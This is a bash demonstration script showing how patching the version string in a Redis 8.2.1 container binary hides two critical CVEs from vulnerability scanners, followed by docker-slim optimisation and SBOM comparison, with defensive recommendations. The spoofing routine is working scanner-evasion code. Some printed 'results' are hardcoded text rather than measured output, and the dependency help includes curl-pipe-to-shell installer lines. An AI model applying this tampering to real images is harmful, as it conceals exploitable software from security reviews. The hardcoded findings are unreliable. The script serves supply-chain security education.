#!/bin/bash

# Author: Denis Maligin, Chainguard, Inc.

# redis-version-spoof.sh
# Demonstrates supply chain attacks via version string manipulation
# Shows catastrophic failure when optimization meets compromised images

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Configuration
VULNERABLE_IMAGE="redis:8.2.1@sha256:5fa2edb1e408fa8235e6db8fab01d1afaaae96c9403ba67b70feceb8661e8621"
SPOOFED_IMAGE="redis:8.2.1-spoofed"
SLIM_SPOOFED_IMAGE="redis:8.2.1-spoofed-slim"
SBOM_OUTPUT_DIR="./sbom-analysis"

show_help() {
    echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║    Redis Supply Chain Attack & docker-slim Demonstration      ║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${YELLOW}CRITICAL CVEs in Redis 8.2.1:${NC}"
    echo "  • CVE-2025-46817: Critical (EPSS 16.9%, Risk Score 14.7)"
    echo "  • CVE-2025-49844: Critical (EPSS 6.8%, Risk Score 6.5)"
    echo "  Both fixed in: 8.2.2"
    echo
    echo -e "${YELLOW}Usage:${NC} $0 [MODE]"
    echo
    echo -e "${YELLOW}MODES (execute in sequence for full demonstration):${NC}"
    echo
    echo -e "  ${GREEN}1. --scan-it${NC}"
    echo "     Baseline vulnerability scan of redis:8.2.1"
    echo "     Shows original CRITICAL CVEs that need patching"
    echo
    echo -e "  ${YELLOW}2. --spoof-it${NC}"
    echo "     Version spoofing attack - fake patch to 8.2.2"
    echo "     Hides CVEs from scanners while remaining vulnerable"
    echo -e "     ${RED}⚠ Creates compromised image${NC}"
    echo
    echo -e "  ${RED}3. --slim-it${NC}"
    echo -e "     ${RED}THE CATASTROPHIC SCENARIO${NC}"
    echo "     Applies docker-slim optimization to SPOOFED image"
    echo "     Result: Small, \"clean\" image that's actually compromised"
    echo -e "     ${RED}⚠ Security by obscurity + Zero traceability${NC}"
    echo "     Generates SBOM for post-mortem analysis"
    echo
    echo -e "  ${CYAN}-h, --help${NC}"
    echo "     Show this help message"
    echo
    echo -e "${YELLOW}DEMONSTRATION SEQUENCE:${NC}"
    echo
    echo "  # Step 1: See the vulnerable baseline"
    echo "  $0 --scan-it"
    echo
    echo "  # Step 2: Attack - spoof version to hide vulnerabilities"
    echo "  $0 --spoof-it"
    echo
    echo "  # Step 3: DISASTER - optimize the compromised image"
    echo "  $0 --slim-it"
    echo
    echo -e "${RED}WHY THIS IS CATASTROPHIC:${NC}"
    echo
    echo "  When docker-slim optimizes a SPOOFED image:"
    echo "  ✗ Scanners report: \"Clean, no CRITICAL CVEs\""
    echo "  ✗ Image size: Small and \"professional looking\""
    echo "  ✗ Reality: Fully exploitable with CRITICAL CVEs"
    echo "  ✗ Traceability: Impossible to track back to compromise"
    echo "  ✗ Metadata: Mostly removed by optimization"
    echo "  ✗ Detection: Nearly impossible without runtime analysis"
    echo "  ✗ Scanner Chaos: Different scanners give different results"
    echo
    echo "  Organizations using docker-slim on unverified images create"
    echo "  the PERFECT ATTACK VECTOR:"
    echo "  • Appears secure (scanner says clean)"
    echo "  • Appears optimized (small size)"
    echo "  • Appears professional (uses \"hardening\" tools)"
    echo "  • IS COMPROMISED (version spoofed before optimization)"
    echo
    echo -e "${YELLOW}DEFENSE REQUIREMENTS:${NC}"
    echo
    echo -e "  ${GREEN}✓${NC} Sign images BEFORE any optimization"
    echo -e "  ${GREEN}✓${NC} Verify signatures at every pipeline stage"
    echo -e "  ${GREEN}✓${NC} Generate SBOMs and sign them cryptographically"
    echo -e "  ${GREEN}✓${NC} Implement SLSA provenance tracking"
    echo -e "  ${GREEN}✓${NC} Never optimize images from untrusted sources"
    echo
    echo -e "${RED}WARNING:${NC} For security research and educational purposes only."
    echo "This demonstrates why cryptographic verification is NON-NEGOTIABLE"
    echo "in supply chain security, especially when using optimization tools."
    echo
}

show_help_short() {
    echo -e "${CYAN}Redis Supply Chain Attack Demo${NC}"
    echo
    echo -e "${YELLOW}Usage:${NC} $0 [MODE]"
    echo
    echo -e "${YELLOW}Modes:${NC}"
    echo "  --scan-it     Scan vulnerable redis:8.2.1 (baseline)"
    echo "  --spoof-it    Attack: spoof version to hide CVEs"
    echo "  --slim-it     DISASTER: optimize compromised image"
    echo "  -h, --help    Show detailed help"
    echo
    echo "Run modes in sequence for full demonstration"
    echo
}

detect_system() {
    if [[ "$OSTYPE" == "darwin"* ]]; then
        OS="macos"
    elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
        OS="linux"
    else
        OS="unknown"
    fi
    
    ARCH=$(uname -m)
    case "$ARCH" in
        x86_64|aarch64) ARCH=${ARCH/aarch64/arm64} ;;
        arm64) ;;
        *) ARCH="unknown" ;;
    esac
}

check_dependencies() {
    local missing_deps=()
    local missing_critical=false
    local mode=$1
    
    # Check Docker
    if ! command -v docker &> /dev/null; then
        missing_deps+=("docker")
        missing_critical=true
        echo -e "${RED}✗ docker: NOT FOUND${NC}"
    else
        echo -e "${GREEN}✓ docker: installed${NC}"
        if ! docker info &> /dev/null; then
            echo -e "${RED}  ⚠ Docker daemon is not running!${NC}"
            missing_critical=true
        fi
    fi
    
    # Check Grype
    if ! command -v grype &> /dev/null; then
        missing_deps+=("grype")
        missing_critical=true
        echo -e "${RED}✗ grype: NOT FOUND${NC}"
    else
        echo -e "${GREEN}✓ grype: installed${NC}"
    fi
    
    # Check jq
    if ! command -v jq &> /dev/null; then
        missing_deps+=("jq")
        missing_critical=true
        echo -e "${RED}✗ jq: NOT FOUND${NC}"
    else
        echo -e "${GREEN}✓ jq: installed${NC}"
    fi
    
    # Check perl
    if ! command -v perl &> /dev/null; then
        missing_deps+=("perl")
        missing_critical=true
        echo -e "${RED}✗ perl: NOT FOUND${NC}"
    else
        echo -e "${GREEN}✓ perl: installed${NC}"
    fi
    
    # Check syft (for SBOM generation)
    if ! command -v syft &> /dev/null; then
        missing_deps+=("syft")
        missing_critical=true
        echo -e "${RED}✗ syft: NOT FOUND (required for SBOM generation in --slim-it)${NC}"
    else
        echo -e "${GREEN}✓ syft: installed${NC}"
    fi
    
    # Check docker-slim (only for slim-it mode)
    if [[ "$mode" == "slim" ]]; then
        if ! command -v docker-slim &> /dev/null; then
            missing_deps+=("docker-slim")
            missing_critical=true
            echo -e "${RED}✗ docker-slim: NOT FOUND (required for --slim-it mode)${NC}"
        else
            echo -e "${GREEN}✓ docker-slim: installed${NC}"
        fi
    else
        if command -v docker-slim &> /dev/null; then
            echo -e "${GREEN}✓ docker-slim: installed (for --slim-it mode)${NC}"
        else
            echo -e "${YELLOW}○ docker-slim: not installed (needed for --slim-it mode)${NC}"
        fi
    fi
    
    if [ "$missing_critical" = true ]; then
        echo
        echo -e "${RED}════════════════════════════════════════════════════════════════${NC}"
        echo -e "${RED}MISSING DEPENDENCIES${NC}"
        echo -e "${RED}════════════════════════════════════════════════════════════════${NC}"
        echo
        
        for dep in "${missing_deps[@]}"; do
            case "$dep" in
                docker-slim)
                    echo -e "${YELLOW}Installing docker-slim:${NC}"
                    echo "  Download from: ${CYAN}https://github.com/slimtoolkit/slim/releases${NC}"
                    echo "  System: ${OS} / ${ARCH}"
                    ;;
                grype)
                    echo -e "${YELLOW}Installing Grype:${NC}"
                    echo "  curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin"
                    ;;
                syft)
                    echo -e "${YELLOW}Installing Syft:${NC}"
                    echo "  curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin"
                    ;;
                jq)
                    echo -e "${YELLOW}Installing jq:${NC}"
                    echo "  apt-get install jq  # or: brew install jq"
                    ;;
            esac
            echo
        done
        exit 1
    fi
    
    echo -e "${GREEN}✓ All required dependencies installed${NC}"
}

scan_image() {
    local image=$1
    local label=$2
    
    echo -e "${CYAN}Scanning $image...${NC}"
    scan_result=$(grype "$image" --output json 2>/dev/null)
    
    critical=$(echo "$scan_result" | jq '.matches | map(select(.vulnerability.severity == "Critical")) | length' 2>/dev/null || echo "0")
    high=$(echo "$scan_result" | jq '.matches | map(select(.vulnerability.severity == "High")) | length' 2>/dev/null || echo "0")
    total=$(echo "$scan_result" | jq '.matches | length' 2>/dev/null || echo "0")
    
    cve_46817=$(echo "$scan_result" | jq -r '.matches[] | select(.vulnerability.id == "CVE-2025-46817") | .vulnerability.id' 2>/dev/null || echo "")
    cve_49844=$(echo "$scan_result" | jq -r '.matches[] | select(.vulnerability.id == "CVE-2025-49844") | .vulnerability.id' 2>/dev/null || echo "")
    
    version=$(echo "$scan_result" | jq -r '.matches[] | select(.artifact.name == "redis") | .artifact.version' 2>/dev/null | head -1)
    
    size=$(docker image inspect "$image" --format='{{.Size}}' 2>/dev/null || echo "0")
    size_mb=$((size / 1024 / 1024))
    
    eval "${label}_CRITICAL=$critical"
    eval "${label}_HIGH=$high"
    eval "${label}_TOTAL=$total"
    eval "${label}_CVE_46817=\"$cve_46817\""
    eval "${label}_CVE_49844=\"$cve_49844\""
    eval "${label}_VERSION=\"$version\""
    eval "${label}_SIZE=$size_mb"
}

generate_sbom() {
    local image=$1
    local output_file=$2
    
    echo -e "${CYAN}Generating SBOM with Syft...${NC}"
    mkdir -p "$SBOM_OUTPUT_DIR"
    
    syft "$image" -o json > "$output_file" 2>/dev/null
    
    if [ -f "$output_file" ]; then
        echo -e "${GREEN}✓ SBOM saved: $output_file${NC}"
        
        # Extract package count
        pkg_count=$(jq '.artifacts | length' "$output_file" 2>/dev/null || echo "0")
        echo "  Packages detected: $pkg_count"
    else
        echo -e "${RED}✗ SBOM generation failed${NC}"
    fi
}

perform_version_spoof() {
    local source_image=$1
    local target_image=$2
    
    echo "Creating temporary container from $source_image..."
    container_id=$(docker create "$source_image")
    echo "Container: $container_id"
    
    echo "Extracting redis-server binary..."
    docker cp "$container_id:/usr/local/bin/redis-server" /tmp/redis-server-orig
    
    echo "Performing version string manipulation..."
    perl -pi -e "s/8\.2\.1/8.2.2/g" /tmp/redis-server-orig 2>/dev/null
    
    if grep -a "8.2.2" /tmp/redis-server-orig >/dev/null 2>&1; then
        echo "✓ Version string successfully modified to 8.2.2"
    fi
    
    if ! grep -a "8.2.1" /tmp/redis-server-orig >/dev/null 2>&1; then
        echo "✓ Original 8.2.1 string removed from binary"
    fi
    
    echo "Injecting modified binary back..."
    docker cp /tmp/redis-server-orig "$container_id:/usr/local/bin/redis-server"
    
    echo "Creating spoofed image..."
    docker commit "$container_id" "$target_image" >/dev/null
    
    docker rm "$container_id" >/dev/null
    rm -f /tmp/redis-server-orig
    
    echo -e "${GREEN}✓ Spoofed image created: $target_image${NC}"
}

# Parse arguments
if [ $# -eq 0 ]; then
    show_help_short
    exit 0
fi

MODE=""
case "$1" in
    --scan-it)
        MODE="scan"
        ;;
    --spoof-it)
        MODE="spoof"
        ;;
    --slim-it)
        MODE="slim"
        ;;
    -h)
        show_help_short
        exit 0
        ;;
    --help)
        show_help
        exit 0
        ;;
    *)
        echo -e "${RED}Unknown option: $1${NC}"
        echo
        show_help_short
        exit 1
        ;;
esac

echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║    Redis Supply Chain Attack & docker-slim Demonstration     ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo

detect_system
echo -e "${CYAN}System: ${OS} / ${ARCH}${NC}"
echo
echo -e "${YELLOW}Checking dependencies...${NC}"
check_dependencies "$MODE"
echo

case "$MODE" in
    scan)
        echo -e "${GREEN}Mode: Baseline Vulnerability Scan${NC}"
        echo -e "${YELLOW}Step 1 of 3: Scanning original vulnerable image${NC}"
        echo
        
        echo "Pulling $VULNERABLE_IMAGE..."
        docker pull "$VULNERABLE_IMAGE" >/dev/null 2>&1
        
        scan_image "$VULNERABLE_IMAGE" "ORIGINAL"
        
        echo
        echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${BLUE}Scan Results: redis:8.2.1${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
        echo
        echo -e "${CYAN}Detected Version:${NC} ${ORIGINAL_VERSION}"
        echo -e "${CYAN}Image Size:${NC} ${ORIGINAL_SIZE} MB"
        echo
        echo "┌────────────────────────────────┬──────────┐"
        echo "│ Severity                       │ Count    │"
        echo "├────────────────────────────────┼──────────┤"
        printf "│ ${RED}%-30s${NC} │ ${RED}%-8s${NC} │\n" "CRITICAL" "$ORIGINAL_CRITICAL"
        printf "│ ${YELLOW}%-30s${NC} │ ${YELLOW}%-8s${NC} │\n" "HIGH" "$ORIGINAL_HIGH"
        printf "│ %-30s │ %-8s │\n" "TOTAL" "$ORIGINAL_TOTAL"
        echo "└────────────────────────────────┴──────────┘"
        echo
        echo -e "${RED}CRITICAL CVEs Found:${NC}"
        [[ -n "$ORIGINAL_CVE_46817" ]] && echo "  • CVE-2025-46817 (EPSS 16.9%, Risk 14.7)"
        [[ -n "$ORIGINAL_CVE_49844" ]] && echo "  • CVE-2025-49844 (EPSS 6.8%, Risk 6.5)"
        echo
        echo -e "${GREEN}✓ Baseline scan completed${NC}"
        echo
        echo -e "${YELLOW}Next step:${NC} $0 --spoof-it"
        ;;
        
    spoof)
        echo -e "${YELLOW}Mode: Version Spoofing Attack${NC}"
        echo -e "${YELLOW}Step 2 of 3: Creating compromised image${NC}"
        echo
        
        # Scan original first
        docker pull "$VULNERABLE_IMAGE" >/dev/null 2>&1
        scan_image "$VULNERABLE_IMAGE" "ORIGINAL"
        
        echo -e "${RED}Performing attack: Version spoofing${NC}"
        echo
        perform_version_spoof "$VULNERABLE_IMAGE" "$SPOOFED_IMAGE"
        
        echo
        echo "Scanning spoofed image..."
        scan_image "$SPOOFED_IMAGE" "SPOOFED"
        
        echo
        echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${BLUE}Attack Results Comparison${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
        echo
        echo "┌────────────────────────────────┬──────────┬──────────┬────────┬───────┐"
        echo "│ Image                          │ Version  │ Critical │ High   │ Total │"
        echo "├────────────────────────────────┼──────────┼──────────┼────────┼───────┤"
        printf "│ %-30s │ %-8s │ ${RED}%-8s${NC} │ ${YELLOW}%-6s${NC} │ %-5s │\n" "redis:8.2.1 (original)" "$ORIGINAL_VERSION" "$ORIGINAL_CRITICAL" "$ORIGINAL_HIGH" "$ORIGINAL_TOTAL"
        printf "│ %-30s │ %-8s │ ${GREEN}%-8s${NC} │ ${GREEN}%-6s${NC} │ %-5s │\n" "redis:8.2.1-spoofed" "$SPOOFED_VERSION" "$SPOOFED_CRITICAL" "$SPOOFED_HIGH" "$SPOOFED_TOTAL"
        echo "└────────────────────────────────┴──────────┴──────────┴────────┴───────┘"
        
        crit_diff=$((ORIGINAL_CRITICAL - SPOOFED_CRITICAL))
        high_diff=$((ORIGINAL_HIGH - SPOOFED_HIGH))
        
        echo
        echo -e "${RED}Attack Impact:${NC}"
        echo "  • Hidden: $crit_diff CRITICAL, $high_diff HIGH vulnerabilities"
        echo "  • CVE-2025-46817: $([ -z "$SPOOFED_CVE_46817" ] && echo -e "${GREEN}HIDDEN ✓${NC}" || echo -e "${RED}Still visible${NC}")"
        echo "  • CVE-2025-49844: $([ -z "$SPOOFED_CVE_49844" ] && echo -e "${GREEN}HIDDEN ✓${NC}" || echo -e "${RED}Still visible${NC}")"
        echo "  • Actual exploitability: ${RED}100% - Binary unchanged${NC}"
        echo
        echo -e "${YELLOW}Scanner verdict:${NC} $([ "$SPOOFED_CRITICAL" -eq 0 ] && echo "${GREEN}PASS - No CRITICAL CVEs${NC}" || echo "${RED}FAIL${NC}")"
        echo -e "${RED}Reality:${NC} Fully vulnerable, version string spoofed"
        echo
        echo -e "${GREEN}✓ Attack completed - compromised image created${NC}"
        echo
        echo -e "${YELLOW}Next step:${NC} $0 --slim-it  ${RED}⚠ THE CATASTROPHIC SCENARIO${NC}"
        ;;
        
    slim)
        echo -e "${RED}Mode: CATASTROPHIC SCENARIO - Optimizing Compromised Image${NC}"
        echo -e "${RED}Step 3 of 3: Security by obscurity meets supply chain attack${NC}"
        echo
        
        # Check if spoofed image exists
        if ! docker image inspect "$SPOOFED_IMAGE" >/dev/null 2>&1; then
            echo -e "${YELLOW}Spoofed image not found. Creating it first...${NC}"
            docker pull "$VULNERABLE_IMAGE" >/dev/null 2>&1
            perform_version_spoof "$VULNERABLE_IMAGE" "$SPOOFED_IMAGE"
            echo
        fi
        
        # Scan spoofed image before slimming
        scan_image "$SPOOFED_IMAGE" "SPOOFED"
        
        echo -e "${RED}Applying docker-slim to COMPROMISED image...${NC}"
        echo -e "${YELLOW}This is what happens when optimization meets unverified images${NC}"
        echo
        
        docker-slim build --tag="$SLIM_SPOOFED_IMAGE" --publish-port 6379 "$SPOOFED_IMAGE"
        
        echo
        echo "Scanning optimized (but compromised) image..."
        scan_image "$SLIM_SPOOFED_IMAGE" "SLIM"
        
        echo
        echo -e "${CYAN}Generating SBOM for post-mortem analysis...${NC}"
        generate_sbom "$SLIM_SPOOFED_IMAGE" "$SBOM_OUTPUT_DIR/redis-8.2.1-spoofed-slim.json"
        
        # Also generate SBOM for spoofed (pre-slim) for comparison
        echo "Generating SBOM for pre-slim image (comparison)..."
        generate_sbom "$SPOOFED_IMAGE" "$SBOM_OUTPUT_DIR/redis-8.2.1-spoofed.json"
        
        echo
        echo -e "${RED}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║               CATASTROPHIC SECURITY FAILURE                   ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════════════════════════════╝${NC}"
        echo
        echo "┌────────────────────────────────┬──────────┬──────────┬────────┬───────┬────────┐"
        echo "│ Image                          │ Version  │ Critical │ High   │ Total │ Size   │"
        echo "├────────────────────────────────┼──────────┼──────────┼────────┼───────┼────────┤"
        printf "│ %-30s │ %-8s │ ${GREEN}%-8s${NC} │ %-6s │ %-5s │ %-6s │\n" "redis:8.2.1-spoofed" "$SPOOFED_VERSION" "$SPOOFED_CRITICAL" "$SPOOFED_HIGH" "$SPOOFED_TOTAL" "${SPOOFED_SIZE}MB"
        printf "│ %-30s │ %-8s │ ${RED}%-8s${NC} │ %-6s │ %-5s │ ${GREEN}%-6s${NC} │\n" "redis:8.2.1-spoofed-slim" "$SLIM_VERSION" "$SLIM_CRITICAL" "$SLIM_HIGH" "$SLIM_TOTAL" "${SLIM_SIZE}MB"
        echo "└────────────────────────────────┴──────────┴──────────┴────────┴───────┴────────┘"
        
        reduction=$(awk "BEGIN {printf \"%.2f\", $SPOOFED_SIZE / $SLIM_SIZE}")
        
        echo
        echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${PURPLE}║           THE METADATA CATASTROPHE - ROOT CAUSE ANALYSIS      ║${NC}"
        echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════╝${NC}"
        echo
        echo -e "${RED}What Just Happened - The Complete Mess:${NC}"
        echo
        echo -e "${YELLOW}1. Version Spoofing Created Initial Chaos:${NC}"
        echo -e "   • Real version: 8.2.1 (vulnerable)"
        echo -e "   • Spoofed version: 8.2.2 (fake)"
        echo -e "   • CVE-2025-46817 & CVE-2025-49844: ${GREEN}HIDDEN from Grype${NC}"
        echo -e "   • But binary still contains 8.2.1 code = ${RED}EXPLOITABLE${NC}"
        echo
        echo -e "${YELLOW}2. docker-slim Destroyed Metadata:${NC}"
        echo -e "   • Removed 88 of 90 packages from metadata"
        echo -e "   • Kept only redis binary + minimal deps"
        echo -e "   • Package database: ${RED}CORRUPTED${NC}"
        echo -e "   • SBOM integrity: ${RED}DESTROYED${NC}"
        echo
        echo -e "${YELLOW}3. Scanner Chaos - Different Results:${NC}"
        echo -e "   ${CYAN}Trivy scan result:${NC}"
        echo -e "     → Finds: ${GREEN}NOTHING${NC} (no packages in corrupted metadata)"
        echo -e "     → Verdict: ${GREEN}CLEAN${NC}"
        echo
        echo -e "   ${CYAN}Grype scan result:${NC}"
        echo -e "     → Finds: ${RED}2 CRITICAL CVEs${NC} (CVE-2022-0543, CVE-2022-3734)"
        echo -e "     → These are ${YELLOW}DIFFERENT${NC} from original CVEs"
        echo -e "     → Grype uses binary analysis fallback"
        echo -e "     → Detects redis binary, but version string is spoofed"
        echo -e "     → Reports wrong CVEs based on corrupted metadata"
        echo
        echo -e "${RED}4. The Root Cause - Layered Failure:${NC}"
        echo
        echo -e "   ${PURPLE}Layer 1: Version Spoofing${NC}"
        echo -e "   ├─ Attacker modified version string in binary"
        echo -e "   ├─ 8.2.1 → fake 8.2.2"
        echo -e "   └─ Original CVEs (2025-46817, 2025-49844) now invisible to scanners"
        echo
        echo -e "   ${PURPLE}Layer 2: docker-slim Metadata Destruction${NC}"
        echo -e "   ├─ Removed package metadata (90 → 2 packages)"
        echo -e "   ├─ Broke package database integrity"
        echo -e "   ├─ Destroyed traceability to source"
        echo -e "   └─ Created inconsistent SBOM"
        echo
        echo -e "   ${PURPLE}Layer 3: Scanner Confusion${NC}"
        echo -e "   ├─ Trivy: Relies on package DB → finds nothing"
        echo -e "   ├─ Grype: Falls back to binary analysis → finds wrong CVEs"
        echo -e "   ├─ Both miss the REAL vulnerabilities (still in binary code)"
        echo -e "   └─ ${RED}Complete scanner failure${NC}"
        echo
        echo -e "${RED}5. Actual Security State:${NC}"
        echo -e "   ${RED}✗ CVE-2025-46817 (CRITICAL): HIDDEN & EXPLOITABLE${NC}"
        echo -e "   ${RED}✗ CVE-2025-49844 (CRITICAL): HIDDEN & EXPLOITABLE${NC}"
        echo -e "   ${RED}✗ Binary code: Unchanged - 100% vulnerable${NC}"
        echo -e "   ${RED}✗ Scanner reports: Unreliable/contradictory${NC}"
        echo -e "   ${RED}✗ Traceability: Impossible${NC}"
        echo -e "   ${RED}✗ Detection: Requires runtime analysis${NC}"
        echo
        echo -e "${CYAN}═══ SBOM Analysis ═══${NC}"
        echo
        echo "Post-mortem SBOM files saved:"
        echo "  • Pre-slim:  $SBOM_OUTPUT_DIR/redis-8.2.1-spoofed.json"
        echo "  • Post-slim: $SBOM_OUTPUT_DIR/redis-8.2.1-spoofed-slim.json"
        echo
        echo "Compare with:"
        echo "  diff <(jq '.artifacts | length' $SBOM_OUTPUT_DIR/redis-8.2.1-spoofed.json) \\"
        echo "       <(jq '.artifacts | length' $SBOM_OUTPUT_DIR/redis-8.2.1-spoofed-slim.json)"
        echo
        echo -e "${PURPLE}═══ Why This Is Catastrophic ═══${NC}"
        echo
        echo -e "${YELLOW}1. Perfect False Confidence:${NC}"
        echo "   • One scanner: ${GREEN}CLEAN${NC}"
        echo "   • Other scanner: Reports ${YELLOW}wrong CVEs${NC}"
        echo "   • Size: ${GREEN}${reduction}x smaller${NC}"
        echo "   • Reality: ${RED}FULLY COMPROMISED${NC}"
        echo
        echo -e "${YELLOW}2. Zero Traceability:${NC}"
        echo "   • Version spoofed before optimization"
        echo "   • Metadata destroyed by docker-slim"
        echo "   • SBOM inconsistent and unreliable"
        echo "   • Supply chain provenance: ${RED}IMPOSSIBLE${NC}"
        echo
        echo -e "${YELLOW}3. Scanner Unreliability:${NC}"
        echo "   • Different scanners, different results"
        echo "   • Neither finds the real vulnerabilities"
        echo "   • Creates false sense of security"
        echo "   • Organizations can't trust their tools"
        echo
        echo -e "${YELLOW}4. Supply Chain Amplification:${NC}"
        echo "   • Appears legitimate and hardened"
        echo "   • Will pass automated security gates"
        echo "   • Will be deployed to production"
        echo "   • ${RED}Will be exploited in the wild${NC}"
        echo
        echo -e "${CYAN}═══ Defense Requirements ═══${NC}"
        echo
        echo -e "${GREEN}BEFORE optimization:${NC}"
        echo "  ✓ Cryptographic signing (Cosign/Notary) - MANDATORY"
        echo "  ✓ SBOM generation and signing"
        echo "  ✓ SLSA provenance attestation"
        echo "  ✓ Verify source authenticity"
        echo "  ✓ Multiple scanner validation"
        echo
        echo -e "${GREEN}AFTER optimization:${NC}"
        echo "  ✓ Re-sign the optimized image"
        echo "  ✓ Generate NEW SBOM for optimized image"
        echo "  ✓ Link to original provenance chain"
        echo "  ✓ Admission controllers verify ALL signatures"
        echo "  ✓ Runtime integrity monitoring"
        echo
        echo -e "${GREEN}RUNTIME:${NC}"
        echo "  ✓ Behavioral monitoring (Falco/Tetragon)"
        echo "  ✓ Binary integrity verification"
        echo "  ✓ Network traffic analysis"
        echo "  ✓ Syscall monitoring"
        echo "  ✓ Anomaly detection"
        echo
        echo -e "${RED}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║  NEVER OPTIMIZE IMAGES WITHOUT CRYPTOGRAPHIC VERIFICATION    ║${NC}"
        echo -e "${RED}║  NEVER TRUST A SINGLE SCANNER                                ║${NC}"
        echo -e "${RED}║  ALWAYS VERIFY SBOM INTEGRITY                                ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════════════════════════════╝${NC}"
        echo
        echo -e "${YELLOW}Root.io, Platform.sh, and similar platforms using docker-slim${NC}"
        echo -e "${YELLOW}MUST verify image signatures BEFORE optimization.${NC}"
        echo -e "${YELLOW}MUST generate and sign SBOMs at every stage.${NC}"
        echo -e "${YELLOW}MUST use multiple scanners for validation.${NC}"
        echo
        echo -e "${GREEN}✓ Demonstration completed${NC}"
        echo
        echo -e "${CYAN}Cleanup:${NC}"
        echo "  docker rmi $SPOOFED_IMAGE $SLIM_SPOOFED_IMAGE"
        echo "  rm -rf $SBOM_OUTPUT_DIR"
        ;;
esac
